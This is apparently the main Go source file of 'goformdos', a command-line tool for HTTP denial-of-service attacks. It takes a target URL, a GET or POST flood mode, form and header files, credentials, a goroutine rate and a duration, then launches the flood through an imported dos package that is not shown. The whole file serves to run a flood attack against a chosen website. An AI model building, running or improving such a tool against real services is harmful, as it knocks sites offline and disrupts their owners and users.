// Author: PiereLucas

package main

import (
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/pierelucas/goformdos/goformdos2/dos"

	"github.com/pierelucas/goformdos/goformdos2/configparser"
)

var (
	flagMode = flag.String(
		"m",
		"",
		"Choose between POST and GET flood")
	flagForms = flag.String(
		"fp",
		"",
		"File containing form parameters")
	flagHeaders = flag.String(
		"hp",
		"",
		"File containing header parameters")
	flagAuth = flag.String(
		"a",
		"",
		"Basic HTTP Authentication")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines/s (per second) should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
	flagOutput = flag.String(
		"o",
		"",
		"output logfile (lot of Foo)")
)

// init()
func validateArgs() (err error) {
	flag.Parse()

	// ## Begin anonyme functions ########################################
	// validateUrl -- validate the given URL
	validateURL := func(urladdr string) error {
		_, err := url.ParseRequestURI(urladdr)
		if err != nil {
			e := fmt.Errorf("%s is invalid url", urladdr)
			return e
		}
		return nil
	}

	// validatePath -- validate filePath
	validatePath := func(fp string) (bool, error) {
		_, err := os.Stat(fp)
		if err != nil {
			return false, err
		}
		return true, err
	}
	// ## End anonyme functions ##########################################

	// check if the right flags are set
	if *flagForms == "" || *flagURL == "" || *flagHeaders == "" || *flagMode == "" || *flagThreads <= 0 || *flagTime <= 0 {
		err = fmt.Errorf("ERROR: please define arguments or use -h for help")
		return err
	}

	// validate URL
	err = validateURL(*flagURL)
	if err != nil {
		return err
	}

	// validate headerfilepath
	_, err = validatePath(*flagHeaders)
	if err != nil {
		err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagHeaders)
		return err
	}

	// validate formfilepath
	_, err = validatePath(*flagForms)
	if err != nil {
		err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagForms)
		return err
	}

	// validate MODE
	if *flagMode != "GET" && *flagMode != "POST" {
		err = fmt.Errorf("ERROR: the mode [%s] does not exist", *flagMode)
		return err
	}

	// validate log output (logfile)
	if *flagOutput != "" {
		_, err := validatePath(*flagOutput)
		if err != nil {
			err = fmt.Errorf("Error: %s not exists or ist not accesible", *flagOutput)
			return err
		}
	}

	// validate authorization
	if *flagAuth != "" {
		if !strings.Contains(*flagAuth, ":") {
			err = fmt.Errorf("ERROR: %s is not a valid username:password", *flagAuth)
			return err
		}
	}

	return nil // Everything seems to be okay :)
}

func main() {
	err := validateArgs() // validate arguments
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// set-up logging
	log.SetFlags(log.LstdFlags)
	log.SetPrefix("goformdos\t")
	if *flagOutput != "" {
		f, err := os.OpenFile(*flagOutput, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Print(err)
			os.Exit(1)
		}
		defer f.Close() // defer = LIFO

		// Set up Logger
		/*
			iLog := log.New(f, "gocrypt-cli", log.LstdFlags)
		*/

		log.SetOutput(f) // set uputput logfile
	}
	log.Println("goformdos-------------------------------")

	// get the start time of the program for later print out of execution time
	start := time.Now()
	// print the execution time at the end of main
	defer func() {
		//fmt.Print("\033[H\033[2J") // clear terminal
		duration := time.Since(start)
		log.Println("INFO: time took for execution:", duration)
		log.Println("INFO: EXIT(0)")
		log.Println("-------------------------------goformdos")
	}()

	info := dos.New(*flagMode, *flagTime, *flagThreads, *flagURL) // Initialize new dos.TargetInf object

	var wg sync.WaitGroup

	// maps to parse in and temporary store our forms and headers
	var (
		forms   = make(map[string]string)
		headers = make(map[string]string)
	)

	// Parse forms and headers from file
	wg = sync.WaitGroup{}
	wg.Add(2)
	go configparser.Parse(&forms, *flagForms, &wg)
	go configparser.Parse(&headers, *flagHeaders, &wg)
	wg.Wait()

	// Append forms and headers to dos.TargetInf and his underlaying structure's
	wg = sync.WaitGroup{}
	wg.Add(2)
	go info.AppendMore("FORMS", forms, &wg)     // Intialize forms
	go info.AppendMore("HEADERS", headers, &wg) // Intialize headers
	wg.Wait()                                   // wait for goroutines to finish task

	// Append Authorization (if set)
	func() {
		if *flagAuth != "" {
			tempSlice := strings.Split(*flagAuth, ":")
			info.AddAuth(tempSlice[0], tempSlice[1])
			tempSlice = nil
		}
	}()

	// Starting the DOS function
	wg = sync.WaitGroup{}
	wg.Add(1)
	go info.Dos(&wg)
	wg.Wait()

	return
}
